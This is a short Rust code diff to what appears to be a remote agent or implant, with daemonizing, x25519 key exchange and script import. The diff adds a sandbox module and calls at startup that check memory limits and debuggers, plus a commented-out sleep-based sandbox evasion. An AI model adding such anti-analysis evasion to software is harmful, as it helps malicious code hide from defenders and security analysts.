@@ -11,6 +11,7 @@ use std::{
 use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
 use rand::rngs::OsRng;
 mod utils;
+mod sandbox;
 
 use utils::ImportedScript;
 
@@ -30,6 +31,11 @@ fn daemonize_process() {
 }
 
 fn main() {
+    sandbox::check_memory_limit();
+    // sandbox::sleep_evasion(Duration::from_secs(3600));
+    #[cfg(windows)]
+    sandbox::check_debugger();
+
     let mut host = "127.0.0.1".to_string();
     let mut port = "8080".to_string();
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
